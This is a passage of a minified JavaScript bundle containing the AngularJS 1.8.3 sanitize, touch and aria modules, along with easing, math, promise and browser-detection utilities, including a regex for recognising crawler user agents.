1==n&&0==s.v?e:i}})}]),o((function(){It(t.document,Pt)})))}(window),!window.angular.$$csp().noInlineStyle&&window.angular.element(document.head).prepend(window.angular.element("<style>").text('@charset "UTF-8";[ng\\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}'))})),Yv=st(((t,e)=>{zv(),e.exports=angular})),Xv=st((()=>{!function(t,e){"use strict";var i,r,n,s,o,a,l,h,c,u,d=e.$$minErr("$sanitize");e.module("ngSanitize",[]).provider("$sanitize",(function(){var p=!1,m=!1;this.$get=["$$sanitizeUri",function(t){return p=!0,m&&r(C,S),function(e){var i=[];return c(e,u(i,(function(e,i){return!/^unsafe:/.test(t(e,i))}))),i.join("")}}],this.enableSvg=function(t){return o(t)?(m=t,this):m},this.addValidElements=function(t){return p||(s(t)&&(t={htmlElements:t}),O(S,t.svgElements),O(y,t.htmlVoidElements),O(C,t.htmlVoidElements),O(C,t.htmlElements)),this},this.addValidAttrs=function(t){return p||r(P,k(t,!0)),this},i=e.bind,r=e.extend,n=e.forEach,s=e.isArray,o=e.isDefined,a=e.$$lowercase,l=e.noop,c=function(t,e){null==t?t="":"string"!=typeof t&&(t=""+t);var i=M(t);if(!i)return"";var r=5;do{if(0===r)throw d("uinput","Failed to sanitize html because the input is unstable");r--,t=i.innerHTML,i=M(t)}while(t!==i.innerHTML);for(var n=i.firstChild;n;){switch(n.nodeType){case 1:e.start(n.nodeName.toLowerCase(),D(n.attributes));break;case 3:e.chars(n.textContent)}var s;if(!(s=n.firstChild)&&(1===n.nodeType&&e.end(n.nodeName.toLowerCase()),!(s=N("nextSibling",n))))for(;null==s&&(n=N("parentNode",n))!==i;)s=N("nextSibling",n),1===n.nodeType&&e.end(n.nodeName.toLowerCase());n=s}for(;n=i.firstChild;)i.removeChild(n)},u=function(t,e){var r=!1,s=i(t,t.push);return{start:function(t,i){t=a(t),!r&&A[t]&&(r=t),!r&&!0===C[t]&&(s("<"),s(t),n(i,(function(i,r){var n=a(r),o="img"===t&&"src"===n||"background"===n;!0===P[n]&&(!0!==T[n]||e(i,o))&&(s(" "),s(r),s('="'),s(R(i)),s('"'))})),s(">"))},end:function(t){t=a(t),!r&&!0===C[t]&&!0!==y[t]&&(s("</"),s(t),s(">")),t==r&&(r=!1)},chars:function(t){r||s(R(t))}}},h=t.Node.prototype.contains||function(t){return!!(16&this.compareDocumentPosition(t))};var f=/[\uD800-\uDBFF][\uDC00-\uDFFF]/g,g=/([^#-~ |!])/g,y=x("area,br,col,hr,img,wbr"),v=x("colgroup,dd,dt,li,p,tbody,td,tfoot,th,thead,tr"),_=x("rp,rt"),b=r({},_,v),w=r({},v,x("address,article,aside,blockquote,caption,center,del,dir,div,dl,figure,figcaption,footer,h1,h2,h3,h4,h5,h6,header,hgroup,hr,ins,map,menu,nav,ol,pre,section,table,ul")),E=r({},_,x("a,abbr,acronym,b,bdi,bdo,big,br,cite,code,del,dfn,em,font,i,img,ins,kbd,label,map,mark,q,ruby,rp,rt,s,samp,small,span,strike,strong,sub,sup,time,tt,u,var")),S=x("circle,defs,desc,ellipse,font-face,font-face-name,font-face-src,g,glyph,hkern,image,linearGradient,line,marker,metadata,missing-glyph,mpath,path,polygon,polyline,radialGradient,rect,stop,svg,switch,text,title,tspan"),A=x("script,style"),C=r({},y,w,E,b),T=x("background,cite,href,longdesc,src,xlink:href,xml:base"),$=x("abbr,align,alt,axis,bgcolor,border,cellpadding,cellspacing,class,clear,color,cols,colspan,compact,coords,dir,face,headers,height,hreflang,hspace,ismap,lang,language,nohref,nowrap,rel,rev,rows,rowspan,rules,scope,scrolling,shape,size,span,start,summary,tabindex,target,title,type,valign,value,vspace,width"),I=x("accent-height,accumulate,additive,alphabetic,arabic-form,ascent,baseProfile,bbox,begin,by,calcMode,cap-height,class,color,color-rendering,content,cx,cy,d,dx,dy,descent,display,dur,end,fill,fill-rule,font-family,font-size,font-stretch,font-style,font-variant,font-weight,from,fx,fy,g1,g2,glyph-name,gradientUnits,hanging,height,horiz-adv-x,horiz-origin-x,ideographic,k,keyPoints,keySplines,keyTimes,lang,marker-end,marker-mid,marker-start,markerHeight,markerUnits,markerWidth,mathematical,max,min,offset,opacity,orient,origin,overline-position,overline-thickness,panose-1,path,pathLength,points,preserveAspectRatio,r,refX,refY,repeatCount,repeatDur,requiredExtensions,requiredFeatures,restart,rotate,rx,ry,slope,stemh,stemv,stop-color,stop-opacity,strikethrough-position,strikethrough-thickness,stroke,stroke-dasharray,stroke-dashoffset,stroke-linecap,stroke-linejoin,stroke-miterlimit,stroke-opacity,stroke-width,systemLanguage,target,text-anchor,to,transform,type,u1,u2,underline-position,underline-thickness,unicode,unicode-range,units-per-em,values,version,viewBox,visibility,width,widths,x,x-height,x1,x2,xlink:actuate,xlink:arcrole,xlink:role,xlink:show,xlink:title,xlink:type,xml:base,xml:lang,xml:space,xmlns,xmlns:xlink,y,y1,y2,zoomAndPan",!0),P=r({},T,I,$);function x(t,e){return k(t.split(","),e)}function k(t,e){var i,r={};for(i=0;i<t.length;i++)r[e?a(t[i]):t[i]]=!0;return r}function O(t,e){e&&e.length&&r(t,k(e))}var M=function(t,e){if(function(){try{return!!n("")}catch(t){return!1}}())return n;if(!e||!e.implementation)throw d("noinert","Can't create an inert html document");var i=e.implementation.createHTMLDocument("inert"),r=(i.documentElement||i.getDocumentElement()).querySelector("body");return function(t){return r.innerHTML=t,e.documentMode&&L(r),r};function n(e){e="<remove></remove>"+e;try{var i=(new t.DOMParser).parseFromString(e,"text/html").body;return i.firstChild.remove(),i}catch(t){return}}}(t,t.document);function D(t){for(var e={},i=0,r=t.length;i<r;i++){var n=t[i];e[n.name]=n.value}return e}function R(t){return t.replace(/&/g,"&amp;").replace(f,(function(t){return"&#"+(1024*(t.charCodeAt(0)-55296)+(t.charCodeAt(1)-56320)+65536)+";"})).replace(g,(function(t){return"&#"+t.charCodeAt(0)+";"})).replace(/</g,"&lt;").replace(/>/g,"&gt;")}function L(e){for(;e;){if(e.nodeType===t.Node.ELEMENT_NODE)for(var i=e.attributes,r=0,n=i.length;r<n;r++){var s=i[r],o=s.name.toLowerCase();("xmlns:ns1"===o||0===o.lastIndexOf("ns1:",0))&&(e.removeAttributeNode(s),r--,n--)}var a=e.firstChild;a&&L(a),e=N("nextSibling",e)}}function N(t,e){var i=e[t];if(i&&h.call(e,i))throw d("elclob","Failed to sanitize html because the element is clobbered: {0}",e.outerHTML||e.outerText);return i}})).info({angularVersion:"1.8.3"}),e.module("ngSanitize").filter("linky",["$sanitize",function(t){var i=/((s?ftp|https?):\/\/|(www\.)|(mailto:)?[A-Za-z0-9._%+-]+@)\S*[^\s.;,(){}<>"\u201d\u2019]/i,r=/^mailto:/i,n=e.$$minErr("linky"),s=e.isDefined,o=e.isFunction,a=e.isObject,h=e.isString;return function(e,c,d){if(null==e||""===e)return e;if(!h(e))throw n("notstring","Expected string but received: {0}",e);for(var p,m,f,g=o(d)?d:a(d)?function(){return d}:function(){return{}},y=e,v=[];p=y.match(i);)m=p[0],!p[2]&&!p[4]&&(m=(p[3]?"http://":"mailto:")+m),f=p.index,_(y.substr(0,f)),b(m,p[0].replace(r,"")),y=y.substring(f+p[0].length);return _(y),t(v.join(""));function _(t){!t||v.push(function(t){var e=[];return u(e,l).chars(t),e.join("")}(t))}function b(t,e){var i,r=g(t);for(i in v.push("<a "),r)v.push(i+'="'+r[i]+'" ');s(c)&&!("target"in r)&&v.push('target="',c,'" '),v.push('href="',t.replace(/"/g,"&quot;"),'">'),_(e),v.push("</a>")}}}])}(window,window.angular)})),Kv=st(((t,e)=>{Xv(),e.exports="ngSanitize"})),Zv=st((()=>{!function(t,e){"use strict";var i=e.module("ngTouch",[]);function r(t,r,n){i.directive(t,["$parse","$swipe",function(i,s){return function(o,a,l){var h,c,u=i(l[t]);var d=["touch"];e.isDefined(l.ngSwipeDisableMouse)||d.push("mouse"),s.bind(a,{start:function(t,e){h=t,c=!0},cancel:function(t){c=!1},end:function(t,e){(function(t){if(!h)return!1;var e=Math.abs(t.y-h.y),i=(t.x-h.x)*r;return c&&e<75&&i>0&&i>30&&e/i<.3})(t)&&o.$apply((function(){a.triggerHandler(n),u(o,{$event:e})}))}},d)}}])}i.info({angularVersion:"1.8.3"}),i.factory("$swipe",[function(){var t={mouse:{start:"mousedown",move:"mousemove",end:"mouseup"},touch:{start:"touchstart",move:"touchmove",end:"touchend",cancel:"touchcancel"},pointer:{start:"pointerdown",move:"pointermove",end:"pointerup",cancel:"pointercancel"}};function i(t){var e=t.originalEvent||t,i=e.touches&&e.touches.length?e.touches:[e],r=e.changedTouches&&e.changedTouches[0]||i[0];return{x:r.clientX,y:r.clientY}}function r(i,r){var n=[];return e.forEach(i,(function(e){var i=t[e][r];i&&n.push(i)})),n.join(" ")}return{bind:function(t,e,n){var s,o,a,l,h=!1;n=n||["mouse","touch","pointer"],t.on(r(n,"start"),(function(t){a=i(t),h=!0,s=0,o=0,l=a,e.start&&e.start(a,t)}));var c=r(n,"cancel");c&&t.on(c,(function(t){h=!1,e.cancel&&e.cancel(t)})),t.on(r(n,"move"),(function(t){if(h&&a){var r=i(t);if(s+=Math.abs(r.x-l.x),o+=Math.abs(r.y-l.y),l=r,!(s<10&&o<10)){if(o>s)return h=!1,void(e.cancel&&e.cancel(t));t.preventDefault(),e.move&&e.move(r,t)}}})),t.on(r(n,"end"),(function(t){!h||(h=!1,e.end&&e.end(i(t),t))}))}}}]),r("ngSwipeLeft",-1,"swipeleft"),r("ngSwipeRight",1,"swiperight")}(window,window.angular)})),ey=st(((t,e)=>{Zv(),e.exports="ngTouch"})),ty=st((()=>{!function(t,e){"use strict";var i="ngAriaDisable",r=e.module("ngAria",["ng"]).info({angularVersion:"1.8.3"}).provider("$aria",(function(){var t={ariaHidden:!0,ariaChecked:!0,ariaReadonly:!0,ariaDisabled:!0,ariaRequired:!0,ariaInvalid:!0,ariaValue:!0,tabindex:!0,bindKeydown:!0,bindRoleForClick:!0};function r(e,r,n,o){return function(a,l,h){if(!h.hasOwnProperty(i)){var c=h.$normalize(r);t[c]&&!s(l,n)&&!h[c]&&a.$watch(h[e],(function(t){t=o?!t:!!t,l.attr(r,t)}))}}}this.config=function(i){t=e.extend(t,i)},this.$get=function(){return{config:function(e){return t[e]},$$watchExpr:r}}})),n=["BUTTON","A","INPUT","TEXTAREA","SELECT","DETAILS","SUMMARY"],s=function(t,e){if(-1!==e.indexOf(t[0].nodeName))return!0};r.directive("ngShow",["$aria",function(t){return t.$$watchExpr("ngShow","aria-hidden",[],!0)}]).directive("ngHide",["$aria",function(t){return t.$$watchExpr("ngHide","aria-hidden",[],!1)}]).directive("ngValue",["$aria",function(t){return t.$$watchExpr("ngValue","aria-checked",n,!1)}]).directive("ngChecked",["$aria",function(t){return t.$$watchExpr("ngChecked","aria-checked",n,!1)}]).directive("ngReadonly",["$aria",function(t){return t.$$watchExpr("ngReadonly","aria-readonly",n,!1)}]).directive("ngRequired",["$aria",function(t){return t.$$watchExpr("ngRequired","aria-required",n,!1)}]).directive("ngModel",["$aria",function(t){function e(e,i,r,o){return t.config(i)&&!r.attr(e)&&(o||!s(r,n))&&("hidden"!==r.attr("type")||"INPUT"!==r[0].nodeName)}function r(t,e){return!e.attr("role")&&e.attr("type")===t&&!s(e,n)}return{restrict:"A",require:"ngModel",priority:200,compile:function(n,s){if(!s.hasOwnProperty(i)){var o=function(t,e){var i=t.type,r=t.role;return"checkbox"===(i||r)||"menuitemcheckbox"===r?"checkbox":"radio"===(i||r)||"menuitemradio"===r?"radio":"range"===i||"progressbar"===r||"slider"===r?"range":""}(s);return{post:function(i,n,s,a){var l=e("tabindex","tabindex",n,!1);function h(){return a.$modelValue}switch(o){case"radio":case"checkbox":r(o,n)&&n.attr("role",o),e("aria-checked","ariaChecked",n,!1)&&i.$watch(h,"radio"===o?function(t){var e=s.value==a.$viewValue;n.attr("aria-checked",e)}:function(){n.attr("aria-checked",!a.$isEmpty(a.$viewValue))}),l&&n.attr("tabindex",0);break;case"range":if(r(o,n)&&n.attr("role","slider"),t.config("ariaValue")){var c=!n.attr("aria-valuemin")&&(s.hasOwnProperty("min")||s.hasOwnProperty("ngMin")),u=!n.attr("aria-valuemax")&&(s.hasOwnProperty("max")||s.hasOwnProperty("ngMax")),d=!n.attr("aria-valuenow");c&&s.$observe("min",(function(t){n.attr("aria-valuemin",t)})),u&&s.$observe("max",(function(t){n.attr("aria-valuemax",t)})),d&&i.$watch(h,(function(t){n.attr("aria-valuenow",t)}))}l&&n.attr("tabindex",0)}!s.hasOwnProperty("ngRequired")&&a.$validators.required&&e("aria-required","ariaRequired",n,!1)&&s.$observe("required",(function(){n.attr("aria-required",!!s.required)})),e("aria-invalid","ariaInvalid",n,!0)&&i.$watch((function(){return a.$invalid}),(function(t){n.attr("aria-invalid",!!t)}))}}}}}}]).directive("ngDisabled",["$aria",function(t){return t.$$watchExpr("ngDisabled","aria-disabled",n,!1)}]).directive("ngMessages",(function(){return{restrict:"A",require:"?ngMessages",link:function(t,e,r,n){r.hasOwnProperty(i)||e.attr("aria-live")||e.attr("aria-live","assertive")}}})).directive("ngClick",["$aria","$parse",function(t,e){return{restrict:"A",compile:function(r,o){if(!o.hasOwnProperty(i)){var a=e(o.ngClick);return function(e,i,r){s(i,n)||(t.config("bindRoleForClick")&&!i.attr("role")&&i.attr("role","button"),t.config("tabindex")&&!i.attr("tabindex")&&i.attr("tabindex",0),t.config("bindKeydown")&&!r.ngKeydown&&!r.ngKeypress&&!r.ngKeyup&&i.on("keydown",(function(t){var i=t.which||t.keyCode;(13===i||32===i)&&(-1===n.indexOf(t.target.nodeName)&&!t.target.isContentEditable&&t.preventDefault(),e.$apply((function(){a(e,{$event:t})})))})))}}}}}]).directive("ngDblclick",["$aria",function(t){return function(e,r,o){o.hasOwnProperty(i)||t.config("tabindex")&&!r.attr("tabindex")&&!s(r,n)&&r.attr("tabindex",0)}}])}(window,window.angular)})),iy=st(((t,e)=>{ty(),e.exports="ngAria"})),jl=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=class{static easeInSine(t){return 0==t||1==t?t:1-Math.cos(t*(Math.PI/2))}static easeOutSine(t){return 0==t||1==t?t:Math.sin(t*(Math.PI/2))}static easeInOutSine(t){return 0==t||1==t?t:-.5*(Math.cos(Math.PI*t)-1)}static easeInQuad(t){return 0==t||1==t?t:t*t}static easeOutQuad(t){return 0==t||1==t?t:t*(2-t)}static easeInCubic(t){return 0==t||1==t?t:t*t*t}static easeInOutQuad(t){return 0==t||1==t?t:t<.5?2*t*t:(4-2*t)*t-1}static easeOutCubic(t){return 0==t||1==t?t:--t*t*t+1}static easeInOutCubic(t){return 0==t||1==t?t:t<.5?4*t*t*t:(t-1)*(2*t-2)*(2*t-2)+1}static easeInQuart(t){return 0==t||1==t?t:t*t*t*t}static easeOutQuart(t){return 0==t||1==t?t:1- --t*t*t*t}static easeInOutQuart(t){return 0==t||1==t?t:t<.5?8*t*t*t*t:1-8*--t*t*t*t}static easeInQuint(t){return 0==t||1==t?t:t*t*t*t*t}static easeOutQuint(t){return 0==t||1==t?t:1+--t*t*t*t*t}static easeInOutQuint(t){return 0==t||1==t?t:t<.5?16*t*t*t*t*t:1+16*--t*t*t*t*t}static easeInExpo(t){return 0==t||1==t?t:Math.pow(2,10*(t-1))}static easeOutExpo(t){return 0==t||1==t?t:1-Math.pow(2,-10*t)}static easeInOutExpo(t){return 0==t||1==t?t:t<.5?.5*Math.pow(2,10*(2*t-1)):.5*(2-Math.pow(2,-10*(2*t-1)))}static easeInCirc(t){return 0==t||1==t?t:1-Math.sqrt(1-t*t)}static easeOutCirc(t){return 0==t||1==t?t:Math.sqrt(1-(t-1)*(t-1))}static easeInOutCirc(t){return 0==t||1==t?t:t<.5?-.5*(Math.sqrt(1-t*t*4)-1):.5*(Math.sqrt(1-4*(t-1)*(t-1))+1)}static easeInBack(t){return 0==t||1==t?t:t*t*(2.70158*t-1.70158)}static easeOutBack(t){return 0==t||1==t?t:(t-1)*(t-1)*(2.70158*(t-1)+1.70158)+1}static easeInOutBack(t){return 0==t||1==t?t:t<.5?2*t*.5*(2*t)*(2*t*3.5949095-2.5949095):.5*((2*t-2)*(2*t-2)*(3.5949095*(2*t-2)+2.5949095)+2)}static easeInElastic(t){return 0==t||1==t?t:Math.pow(2,10*(t-1))*Math.sin((t-1.075)*(2*Math.PI)/.3)*-1}static easeOutElastic(t){return 0==t||1==t?t:Math.pow(2,-10*t)*Math.sin((t-.075)*(2*Math.PI)/.3)+1}static easeInOutElastic(t){return 0==t||1==t?t:t<.5?Math.pow(2,10*(2*t-1))*Math.sin(2*(2*t-1.1125)*Math.PI/.45)*-.5:.5*Math.pow(2,-10*(2*t-1))*Math.sin(2*(2*t-1.1125)*Math.PI/.45)+1}static easeInBounce(t){return 0==t||1==t?t:1-e.easeOutBounce(1-t)}static easeOutBounce(t){return 0==t||1==t?t:t<1/2.75?7.5625*t*t:t<2/2.75?7.5625*(t-1.5/2.75)*(t-1.5/2.75)+.75:t<2.5/2.75?7.5625*(t-2.25/2.75)*(t-2.25/2.75)+.9375:7.5625*(t-2.625/2.75)*(t-2.625/2.75)+.984375}static easeInOutBounce(t){return 0==t||1==t?t:t<.5?.5*e.easeInBounce(2*t):.5*e.easeOutBounce(2*t-1)+.5}static linear(t){return t}};t.EASE=e})),di=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=jl(),i=class{static absZero(t){return-0==t?0:t}static fixDigits(t,e){return+parseFloat(t).toFixed(e)}static int(t){return i.fixDigits(t,0)}static int0(t){return t>>0}static flipCoin(){return i.getRandomInt(0,1)}static getRandomFloat(t,e){return Math.random()*(e-t)+t}static getRandomInt(t,e){return Math.floor(Math.random()*(e-t+1))+t}static getUniqueRandomInt(t,e,r){let n=i.getRandomInt(t,e);return n==r?i.getUniqueRandomInt(t,e,r):n}static clamp(t,e,i){return Math.min(Math.max(i,t),e)}static childProgress(t,e,r,n=!1){let s=r-e,o=i.clamp(0,1,t-e);return n&&(o=t-e),o/=s,n?o:i.clampAsPercent(o)}static roundToPrecision(t,e){e=i.int(e);let r=Math.pow(10,e);return Math.round(t*r)/r}static floorToPrecision(t,e){e=i.int(e);let r=Math.pow(10,e);return Math.floor(t*r)/r}static ceilToPrecision(t,e){e=i.int(e);let r=Math.pow(10,e);return Math.ceil(t*r)/r}static toFixed(t,e){return+t.toFixed(e)}static angleRadians(t,e,i,r){return Math.atan2(r-e,i-t)}static angleDegree(t,e,i,r){return 180*Math.atan2(r-e,i-t)/Math.PI}static angleDistanceDegree(t,e,r){let n=i.degreeToRadian(t),s=i.degreeToRadian(e);r&&(r=i.degreeToRadian(r));let o=i.angleDistanceRadian(n,s,r);return i.radianToDegree(o)}static angleDistanceRadian(t,e,i){i||(i=2*Math.PI);let r=(e-t)%i;return 2*r%i-r}static degreeToRadian(t){return t*(Math.PI/180)}static radianToDegree(t){return 180*t/Math.PI}static boxCollision(t,e){return!(t.y+t.height<e.y||t.y>e.y+e.height||t.x+t.width<e.x||t.x>e.x+e.width)}static collisionCircVsBox(t,e){let i=t.x-Math.max(e.x,Math.min(t.x,e.x+e.width)),r=t.y-Math.max(e.y,Math.min(t.y,e.y+e.height));return i*i+r*r<t.radius*t.radius}static collisionPointVersusConvexPolygon(t,e){let i=!1,r=e.length,n=0,s=r-1;for(var o=0;o<r;o++){let r=e[n],o=e[s];r.y>t.y!=o.y>t.y&&t.x<(o.x-r.x)*(t.y-r.y)/(o.y-r.y)+r.x&&(i=!i),s=n,n++}return i}static calculate2dPointRotation(t,e,i,r,n){let s=Math.cos(n),o=Math.sin(n);return{x:s*(i-t)+o*(r-e)+t,y:s*(r-e)-o*(i-t)+e}}static calculate2dPointRotationWithDistance(t,e,i,r,n,s){var o=n+Math.atan2(r-e,i-t);return{x:i=t+s*Math.cos(o),y:r=e+s*Math.sin(o)}}static distance(t,e,i,r){return Math.sqrt(Math.pow(i-t,2)+Math.pow(r-e,2))}static direction(t,e){return t==e?0:t<e?1:-1}static calculateCenterOffset(t,e){return t/2-e/2}static scaleX(t,e,i){return t*i/e}static scaleY(t,e,i){return i*e/t}static aspectRatio(t){return t.width/t.height}static isBetween(t,e,i,r=!0){let n=Math.min(e,i),s=Math.max(e,i);return r?t>=n&&t<=s:t>n&&t<s}static resizeDimensionalBoxToWidth(t,e){return{width:e,height:i.scaleY(t.width,t.height,e)}}static resizeDimensionalBoxToHeight(t,e){return{width:i.scaleX(t.width,t.height,e),height:e}}static clampAsPercent(t){return i.clamp(0,1,i.absZero(t))}static clampAsProgress(t){return i.clampAsPercent(t)}static clamp01(t){return i.clampAsPercent(t)}static getValueInRangeByProgress(t,e,r){return i.lerp(e,r,t)}static getProgressInRangeByValue(t,e,r){return i.clampAsPercent((t-e)/(r-e))}static normalize(t,e,r){return i.getProgressInRangeByValue(t,e,r)}static lerp(t,e,r){return t+(e-t)*i.clamp01(r)}static inverseLerp(t,e,r,n=!1){return n?(r-t)/(e-t):i.clamp01((r-t)/(e-t))}static mix(t,e,i){return t*(1-i)+e*i}static step(t,e){return e>t?1:0}static smoothStep(t,e,i){var r=Math.max(0,Math.min(1,(i-t)/(e-t)));return r*r*(3-2*r)}static interpolateRange(t,e,r,n,s){let o=i.clampAsProgress(t/(r-e));return i.lerp(n,s,o)}static sinNormalized(t){return i.interpolateRange(Math.sin(t)+1,0,2,0,1)}static lerpEase(t,r,n,s=e.EASE.linear){return n=s(n),i.lerp(t,r,n)}static damp(t,e,r,n){return i.lerp(t,e,1-Math.exp(-r*n))}static ease(t,r,n,s=e.EASE.linear){return i.lerpEase(t,r,n,s)}static wrap(t,e,i){let r=i-e;return e+((t-e)%r+r)%r}static calculateBackgroundCover(t,e){let r,n,s,o=i.aspectRatio(t);i.aspectRatio(e)>=o?(n=t.height,s=t.height/e.height,r=e.width*s):(r=t.width,s=t.width/e.width,n=e.height*s);let a=Math.max(r/e.width,n/e.height),l=i.absZero(-Math.round((t.height-n)/2)),h=i.absZero(-Math.round((t.width-r)/2));return{width:Math.round(r),height:Math.round(n),xOffset:h,yOffset:l,scalar:a}}static calculateBackgroundContain(t,e){t.width,t.height,e.width,e.height;let i=t.height/e.height,r=t.width/e.width;return Math.min(i,r)}static asymptoticAverage(t,e,i){return t+(e-t)*i}static smoothStart2(t){return t*t}static smoothStop2(t){return 1-(1-t)*(1-t)}static smoothStart3(t){return t*t*t}static smoothStop3(t){return 1-(1-t)*(1-t)*(1-t)}static smoothStep2(t,e,r){return i.lerp(i.smoothStart2(t),i.smoothStop2(t),e)*r}static sigmoid(t,e){return this.smoothStep2(t,e,t)}static remap(t,e,r,n,s){let o=i.inverseLerp(r,n,s);return i.lerp(t,e,o)}};i.generateRandomPoints=(t,e,r,n,s)=>{let o=[];for(let a=0;a<t;a++)o.push({x:i.getRandomInt(e,r),y:i.getRandomInt(n,s)});return o},t.mathf=i})),Yl=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});t.Defer=class{constructor(){this.resolve=()=>{},this.reject=()=>{},this.complete=!1,this.promise=new Promise(((t,e)=>{this.resolve=e=>(this.complete=!0,t(e)),this.reject=t=>(this.complete=!0,e(t))}))}getPromise(){return this.complete?new Promise(((t,e)=>{t()})):this.promise}}})),Zr=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=class{static type(t,e){return e==Object.prototype.toString.call(t).slice(8,-1).toLowerCase()}static boolean(t){return e.type(t,"boolean")}static array(t){return e.type(t,"array")}static string(t){return e.type(t,"string")}static date(t){return e.type(t,"date")}static number(t){return e.type(t,"number")}static function(t){return e.type(t,"function")}static null(t){return e.type(t,"null")}static undefined(t){return e.type(t,"undefined")}static defined(t){return!e.undefined(t)}static regex(t){return e.type(t,"regexp")}static object(t){return e.type(t,"object")}static int(t){return e.number(t)&&t%1==0}static float(t){return e.number(t)&&!e.int(t)}static multipleOf(t,i){return e.number(t)&&t%i==0}static powerOf2(t){return 0!==t&&0==(t&t-1)}static even(t){return e.number(t)&&e.multipleOf(t,2)}static odd(t){return e.number(t)&&!e.even(t)}static nan(t){return t!=t}static mobile(){return e.ios()||e.android()}static ios(){return/iPhone|iPad|iPod/i.test(navigator.userAgent)||e.ipad()}static android(){return/Android/i.test(navigator.userAgent)}static chrome(){return-1!=navigator.userAgent.indexOf("Chrome")&&!e.edge()}static safari(){return!e.chrome()&&-1!=navigator.userAgent.indexOf("Safari")&&!e.edge()}static ipad(){return-1!==navigator.userAgent.toLowerCase().indexOf("macintosh")&&navigator.maxTouchPoints&&navigator.maxTouchPoints>2}static edge(){return-1!=navigator.userAgent.indexOf("Edge")}static firefox(){return-1!=navigator.userAgent.indexOf("Firefox")}static ie(){return/MSIE\/\d+/.test(navigator.userAgent)}static ieOrEdge(){return/Edge\/\d+/.test(navigator.userAgent)||/MSIE\/\d+/.test(navigator.userAgent)||/Trident\/\d+/.test(navigator.userAgent)}static chromeOs(){return/\bCrOS\b/.test(navigator.userAgent)}static supportingOffScreenCanvas(){return!!window.OffscreenCanvas}static supportingWebp(){var t=document.createElement("canvas"),i=!1;return t.toDataURL("image/webp")&&(i=0==t.toDataURL("image/webp").indexOf("data:image/webp")),e.firefox()&&+navigator.userAgent.match(/Firefox\/(.*)/)[1]>=65&&(i=!0),e.edge()&&+navigator.userAgent.match(/Edge\/(.*)/)[1]>=18&&(i=!0),i}static supportingWebpAsync(){return new Promise(((t,e)=>{var i=new Image;i.onload=function(){var e=i.width>0&&i.height>0;t(e)},i.onerror=()=>{t(!1)},i.src="data:image/webp;base64,UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA=="}))}static supportingAdvancedCssCalc(){return document.body.style.transitionTimingFunction="cubic-bezier(calc(1 * 1),1,1,1)","ease"!=getComputedStyle(document.body).transitionTimingFunction}static supportingTouch(){return"ontouchstart"in window||window.DocumentTouch&&document instanceof window.DocumentTouch}static supportingDeviceOrientation(){return!!window.DeviceOrientationEvent}static supportingFileApis(){return!!(window.File&&window.FileReader&&window.FileList&&window.Blob)}static supportingCreateImageBitmap(){return!!window.createImageBitmap&&!e.firefox()}static cssHex(t){return e.string(t)&&t.startsWith("#")}static cssRgba(t){return e.string(t)&&t.startsWith("rgba(")}static cssRgb(t){return e.string(t)&&t.startsWith("rgb(")}static hex(t){var i=parseInt(t,16);return e.string(t)&&i.toString(16)===t.toLowerCase()}static windowLoaded(){return 0!==performance.timing.loadEventEnd}static isGoogleCloudLikeUrl(t){return t.includes("googleusercontent.com")}static isLandscape(){return window.innerWidth>=window.innerHeight}static landscape(){return window.innerWidth<window.innerHeight}static isPortrait(){return window.innerWidth<window.innerHeight}static portrait(){return window.innerWidth<window.innerHeight}static bot(){return new RegExp("(googlebot/|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)","i").test(navigator.userAgent)}};t.is=e})),Ks=st((t=>{"use strict";Object.defineProperty(t,"__esModule",{value:!0});var e=Zr(),i=class{static now(){return Date.now()}static timeDiffMs(t,e){return e-t}static isInBetween(t,e,i){return t&&e?i>=t&&i<e:t?i>=t:!!e&&i<e}static utcDateToLocalTimeZone(t){if(e.is.safari())return t;var i=6e4*t.getTimezoneOffset();return new Date(t.getTime()-i)}static createLocalTimeZoneDate(t){if(e.is.safari()){let e=new Date(t);var i=6e4*e.getTimezoneOffset();return new Date(e.getTime()+i)}return new Date(t)}static 